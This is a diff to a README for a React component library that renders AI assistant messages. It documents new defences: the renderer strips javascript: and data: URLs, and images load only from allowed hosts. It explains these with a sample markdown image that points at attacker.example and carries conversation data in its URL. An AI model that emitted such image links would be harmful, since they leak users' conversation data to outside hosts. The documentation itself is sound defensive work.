@@ -207,7 +207,7 @@ Thinking, working, waiting for approval, done or error, with an elapsed timer. C
 
 <img src="docs/media/components/agent-message.png" width="100%" alt="An assistant message: a collapsed Reasoning section, a line of text, a two-step tool timeline, a sentence with bold text and citation markers 1 and 3, and a row of source chips.">
 
-A whole assistant `UIMessage`, part by part: streaming-safe markdown (unterminated syntax is closed while streaming, raw HTML is never rendered), collapsible reasoning that summarizes how long the model thought, consecutive tool parts grouped into one timeline with inline approval cards, files, `data-*` parts through `renderData`, and sources. `renderTool` lets you take over any tool part, as the playground does for `review_changes`.
+A whole assistant `UIMessage`, part by part: streaming-safe markdown (unterminated syntax is closed while streaming, raw HTML is never rendered, `javascript:` and `data:` URLs are stripped), collapsible reasoning that summarizes how long the model thought, consecutive tool parts grouped into one timeline with inline approval cards, files, `data-*` parts through `renderData`, and sources. `renderTool` lets you take over any tool part, as the playground does for `review_changes`.
 
 ```tsx
 <AgentMessage
@@ -219,7 +219,13 @@ A whole assistant `UIMessage`, part by part: streaming-safe markdown (unterminat
 />
 ```
 
-`Markdown`, `Reasoning` and `JsonView` are exported on their own as well.
+Images in text and reasoning do not load unless their host is allowed: a URL in model output can carry data out of the conversation as soon as the browser fetches it (`![](https://attacker.example/p.png?d=…)`), so by default an image renders as a link with its alt text. Allow the hosts you trust, or `'*'` for any:
+
+```tsx
+<AgentMessage message={last} allowedImageHosts={['images.example.com']} />
+```
+
+`Markdown`, `Reasoning` and `JsonView` are exported on their own as well, and `Markdown` and `Reasoning` take the same `allowedImageHosts`.
 
 ## How it maps to AI SDK message parts
 
